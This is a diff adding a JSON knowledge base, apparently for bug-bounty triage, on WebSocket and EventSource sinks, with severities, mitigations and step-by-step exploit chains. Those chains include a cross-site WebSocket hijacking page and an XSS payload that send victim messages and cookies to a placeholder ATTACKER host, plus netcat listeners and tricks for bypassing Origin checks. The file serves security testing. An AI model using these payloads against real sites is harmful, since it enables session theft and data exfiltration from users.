@@ -1,0 +1,282 @@
+{
+  "category": "websocket",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-websocket-constructor",
+      "name": "WebSocket",
+      "category": "websocket",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "new WebSocket",
+        "WebSocket(",
+        "websocket",
+        "wss://",
+        "ws://"
+      ],
+      "severity": "P3",
+      "severity_note": "Tainted socket URL that leaks app-level auth data: P3; cross-site WebSocket hijacking (missing server Origin check) riding a victim session: P3 typical; P5 when only public data streams.",
+      "explain": "new WebSocket(url) opens a persistent, full-duplex channel. Two distinct bugs live here: the URL is built from attacker input so the app connects to an attacker server and pushes its secrets there, and the server accepts cross-origin socket upgrades (no Origin check), letting an attacker page open a socket as the victim.",
+      "how_it_works": "The browser performs an HTTP Upgrade handshake; cookies for the target host are attached automatically, and after the upgrade the channel bypasses same-origin policy entirely because WebSocket is not CORS-governed. If the server never validates the Origin header, any website the victim visits can speak the socket protocol with the victim's session.",
+      "why_it_matters": "WebSocket is where CSRF-style thinking returns: full session riding plus bidirectional data flow. A tainted constructor URL turns the app into an exfiltration agent, and a missing Origin check turns every victim browser into a proxy for the attacker's socket client.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "localStorage",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches the constructor",
+              "payload": "?ws=wss://ATTACKER/ws",
+              "command": "open 'https://TARGET/app?ws=wss://ATTACKER/ws' in a browser with DevTools Network filtered to WS",
+              "indicator": "the WS panel shows a connection attempt to wss://ATTACKER/ws"
+            },
+            {
+              "action": "Observe the handshake at the attacker end",
+              "payload": "?ws=wss://ATTACKER/ws",
+              "command": "run 'nc -lvnp 8080' on the ATTACKER host and repeat the open (point ws at the listener port)",
+              "indicator": "the listener receives the HTTP Upgrade request including the app's requested subprotocols, proving the app dials attacker infrastructure"
+            },
+            {
+              "action": "Complete the handshake and capture the auth message",
+              "payload": "?ws=wss://ATTACKER/ws",
+              "command": "on the ATTACKER host run 'npx wscat -l 8080' (or any WS server) and reload the TARGET URL",
+              "indicator": "right after connect the application sends its auth message (for example {\"token\":\"SESSION_ID\"}) to the ATTACKER server"
+            }
+          ],
+          "eligibility": "A tainted WebSocket URL that leaks app-level auth data is accepted as sensitive-data exposure (P3); it requires the app to auto-send tokens after connect, so capture that message in the report or expect a downgrade."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Test the socket endpoint for a missing Origin check",
+              "payload": "Origin: https://ATTACKER",
+              "command": "curl -s -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==' -H 'Origin: https://ATTACKER' -H 'Cookie: session=SESSION_ID' 'https://TARGET/ws'",
+              "indicator": "the server answers 101 Switching Protocols despite the foreign Origin header"
+            },
+            {
+              "action": "Build the cross-origin rider page",
+              "payload": "<script>var w=new WebSocket('wss://TARGET/ws');w.onmessage=function(e){fetch('https://ATTACKER/log?m='+encodeURIComponent(e.data))}</script>",
+              "command": "host the page on ATTACKER and open 'https://ATTACKER/poc' in a browser logged in to TARGET as YOUR_ACCOUNT",
+              "indicator": "the ATTACKER log fills with the victim session's private socket messages (orders, notifications, chat), proving cross-site WebSocket hijacking"
+            }
+          ],
+          "eligibility": "CSWSH is accepted on major platforms when private data crosses origins (P3 typical); it drops to P5/informational when the stream carries only public data, and it is invalid where the server validates Origin."
+        }
+      ],
+      "contexts": {
+        "js-string": "the constructor URL is often concatenated from config plus user input; scheme (ws vs wss) and host are both attacker-relevant",
+        "handshake": "cookies ride the HTTP Upgrade automatically; the Origin header is the only server-side tripwire",
+        "protocol": "after the upgrade there is no CORS and no WAF inspection on many stacks, so message-level trust is total"
+      },
+      "waf_notes": "ws:// from an https page is blocked as mixed content, so use wss:// in payloads. Weak Origin checks compare suffixes: try 'https://TARGET.ATTACKER', 'https://ATTACKERTARGET.com' style confusion, and a null Origin sent from a sandboxed iframe or a data: page. Many HTTP WAFs stop inspecting traffic after the 101 response.",
+      "eligibility": "Two honest verdicts: tainted-URL exfiltration needs a captured auth message to be more than theoretical, and CSWSH needs private data crossing origins. Both are solid P3 with that evidence and weak without it.",
+      "mitigations": [
+        "Validate the Origin header server-side against an exact allowlist before returning 101",
+        "Authenticate the socket with a token in the subprotocol or first message, not cookies alone",
+        "Never build the constructor URL from user input",
+        "Enforce wss:// only and reject plaintext upgrades"
+      ],
+      "related": [
+        "WebSocket onmessage",
+        "EventSource",
+        "document.domain"
+      ],
+      "references": [
+        "PortSwigger: Cross-site WebSocket hijacking",
+        "OWASP WSTG: Testing WebSockets",
+        "HackTricks: CSWSH"
+      ]
+    },
+    {
+      "id": "sink-eventsource",
+      "name": "EventSource",
+      "category": "websocket",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "new EventSource",
+        "EventSource(",
+        "eventsource"
+      ],
+      "severity": "P4",
+      "severity_note": "EventSource is a credentialed GET constrained by CORS, so a tainted URL mostly enables forced requests and blind probing: P4/P5 typical, P3 only with a demonstrated event-data leak into an HTML sink.",
+      "explain": "new EventSource(url) subscribes the page to a server-sent events stream over plain HTTP. When the URL is attacker-influenced, the victim browser subscribes to attacker-chosen endpoints, and when the stream's event data is rendered unsafely the SSE channel becomes an XSS delivery pipe.",
+      "how_it_works": "Unlike WebSocket, EventSource is a normal HTTP GET governed by CORS: cross-origin targets must opt in with Access-Control-Allow-Origin, and credentials ride along only when withCredentials is set. The real danger is the onmessage handler, which often treats e.data as trusted HTML.",
+      "why_it_matters": "SSE endpoints frequently reflect request parameters into the event stream (chat channels, notification topics, ticker symbols). A tainted EventSource URL plus an innerHTML rendering handler is a stored-or-reflected XSS chain that bypasses every WAF rule written for classic form input.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "xhr-response",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches the EventSource URL",
+              "payload": "?ch=jlf-trace",
+              "command": "open 'https://TARGET/live?ch=jlf-trace' in a browser with DevTools Network open",
+              "indicator": "the Network tab shows an EventSource GET whose URL contains the ch value and a 200 text/event-stream response"
+            },
+            {
+              "action": "Check the onmessage handler for an HTML sink",
+              "payload": "?ch=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/live?ch=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the server reflects the ch parameter into an SSE event and the alert fires when the handler renders e.data via innerHTML"
+            },
+            {
+              "action": "Confirm the safe-path control",
+              "payload": "?ch=<b>jlf-trace</b>",
+              "command": "repeat the open and inspect the rendered node in DevTools",
+              "indicator": "if the value renders as literal text instead of a bold element, the handler uses textContent and the chain is dead; record the difference"
+            }
+          ],
+          "eligibility": "Exploitable only when the stream reflects input AND the handler hits an HTML sink; verify both halves. When it fires it is accepted as DOM XSS (P2/P3); when the handler uses textContent there is no bug."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Point the stream at a privileged same-origin endpoint",
+              "payload": "?feed=/admin/stream",
+              "command": "open 'https://TARGET/live?feed=/admin/stream' in a browser logged in as YOUR_ACCOUNT",
+              "indicator": "DevTools shows a 200 event-stream subscription to /admin/stream under the victim session"
+            },
+            {
+              "action": "Assess actual data exposure",
+              "payload": "?feed=/admin/stream",
+              "command": "watch the EventStream tab in DevTools for event payloads",
+              "indicator": "if privileged events render in the page, there is an authorization bug on the endpoint; if events only flow into the page logic without readout for the attacker, impact is blind and minimal"
+            }
+          ],
+          "eligibility": "A forced blind subscription with no attacker readout is usually informational/P5; report only with demonstrated data exposure, and note that cross-origin EventSource fails without a CORS opt-in from the target."
+        }
+      ],
+      "contexts": {
+        "js-string": "the constructor URL concatenation is the injection point; same-origin paths need no CORS help",
+        "event-stream": "e.data arriving from the server is attacker-influenced whenever the stream reflects user input",
+        "cors": "cross-origin subscription requires Access-Control-Allow-Origin on the target; withCredentials defaults to false cross-origin"
+      },
+      "waf_notes": "SSE responses are long-lived HTTP and often excluded from WAF response inspection. Event data bypasses input validation written for request parameters because the reflection happens asynchronously server-side. Test whether the endpoint reflects the topic/channel parameter verbatim into event payloads.",
+      "eligibility": "Honest baseline: tainted EventSource URL alone is a low-impact forced-GET primitive (P4/P5). The paying chain is reflected event data into an HTML sink, which is plain DOM XSS and is triaged as such.",
+      "mitigations": [
+        "Build EventSource URLs from an allowlist of channel ids, never raw input",
+        "Render event data with textContent, never innerHTML",
+        "Authorize every stream endpoint server-side per subscription",
+        "Avoid reflecting request parameters into event payloads"
+      ],
+      "related": [
+        "WebSocket",
+        "WebSocket onmessage",
+        "innerHTML"
+      ],
+      "references": [
+        "MDN: EventSource",
+        "OWASP WSTG: Testing WebSockets",
+        "PortSwigger: DOM XSS"
+      ]
+    },
+    {
+      "id": "sink-websocket-message-handler",
+      "name": "WebSocket onmessage",
+      "category": "websocket",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "ws.onmessage",
+        "socket.onmessage",
+        "onmessage",
+        "websocket message"
+      ],
+      "severity": "P2",
+      "severity_note": "Server-pushed data treated as trusted and rendered: DOM XSS P2/P3; downgrades when the socket server is fully trusted and no user input can enter the stream.",
+      "explain": "The onmessage handler receives e.data from the socket and too often passes it straight to innerHTML, eval, or location. Any attacker who can influence the stream (chat input reflected to other users, a tainted constructor URL, or a MitM on plaintext ws://) injects payloads that detonate in every connected client.",
+      "how_it_works": "Developers assume the socket server is a trusted peer, so message data skips the sanitization applied to HTTP input. But the server frequently echoes other users' content, the constructor URL may be attacker-chosen, and ws:// without TLS lets any network attacker rewrite frames. The handler is where that trust becomes code execution.",
+      "why_it_matters": "WebSocket-delivered XSS spreads to every connected client at once: one poisoned message is a stored-XSS worm across sessions. It also evades WAF rule sets that only inspect HTTP request/response pairs and never see upgraded socket traffic.",
+      "exploitable_when": [
+        "websocket-message",
+        "broadcastchannel-message",
+        "xhr-response",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "websocket-message",
+          "steps": [
+            {
+              "action": "Confirm the handler renders message data as HTML",
+              "payload": "{\"msg\":\"<b>jlf-trace</b>\"}",
+              "command": "open 'https://TARGET/chat' as YOUR_ACCOUNT, then send the payload from a second test account over the app's normal chat UI",
+              "indicator": "the message renders bold in the first session, proving HTML parsing of socket data"
+            },
+            {
+              "action": "Detonate script through the stream",
+              "payload": "{\"msg\":\"<img src=x onerror=alert(document.domain)>\"}",
+              "command": "send the payload from the second account and watch the first session",
+              "indicator": "the alert fires in every connected client, i.e. stored XSS delivered over the socket"
+            },
+            {
+              "action": "Escalate to session theft",
+              "payload": "{\"msg\":\"<img src=x onerror=fetch('https://ATTACKER/c?c='+document.cookie)>\"}",
+              "command": "send the payload from the second account with an ATTACKER listener running 'nc -lvnp 8080'",
+              "indicator": "the listener logs the cookie of the receiving session"
+            }
+          ],
+          "eligibility": "Socket-delivered stored XSS is accepted like any stored XSS (P2/P3). If only the attacker's own client ever renders the payload it is self-XSS and usually not eligible; say so explicitly when that is the case."
+        },
+        {
+          "source": "websocket-message",
+          "steps": [
+            {
+              "action": "Confirm a message-to-eval code path",
+              "payload": "{\"cmd\":\"jlf-trace\"}",
+              "command": "open 'https://TARGET/tool', set a breakpoint on the ws.onmessage handler, and send the payload from a second client",
+              "indicator": "the breakpoint shows e.data (or a field of it) flowing into an eval or Function call"
+            },
+            {
+              "action": "Execute arbitrary script in the receiver",
+              "payload": "{\"cmd\":\"alert(document.domain)\"}",
+              "command": "send the payload from the second client",
+              "indicator": "the alert fires in the receiving session, proving remote script execution through the message handler"
+            }
+          ],
+          "eligibility": "Message-to-eval is remote script execution in every connected client and is triaged as high-impact XSS; the only common rejection is a stream provably unreachable by attacker input."
+        }
+      ],
+      "contexts": {
+        "js-string": "e.data is a string; JSON.parse plus property access is the usual shape, and any property can carry markup",
+        "event-handler": "the handler runs in page origin with full DOM and storage access, so downstream sinks inherit everything",
+        "transport": "ws:// without TLS exposes frames to network tampering; wss:// removes the MitM path but not the reflected-content path"
+      },
+      "waf_notes": "Socket traffic bypasses HTTP WAF inspection after the 101 upgrade on many stacks. Payloads hide inside JSON fields that request-parameter rules never see. The meaningful controls are output-side: textContent rendering and schema validation of message fields.",
+      "eligibility": "Verdict depends on stream reachability: attacker-influenced stream plus HTML/eval sink is accepted XSS; a fully trusted stream with no user content is not a bug. Document exactly how attacker input enters the stream, because that is the triage question.",
+      "mitigations": [
+        "Render message data with textContent or a sanitizer, never innerHTML or eval",
+        "Validate message JSON against a strict schema before use",
+        "Enforce wss:// and authenticate the socket",
+        "Sanitize user content server-side before broadcasting it to other clients"
+      ],
+      "related": [
+        "WebSocket",
+        "EventSource",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: Cross-site WebSocket hijacking",
+        "OWASP WSTG: Testing WebSockets",
+        "HackTricks: CSWSH"
+      ]
+    }
+  ]
+}
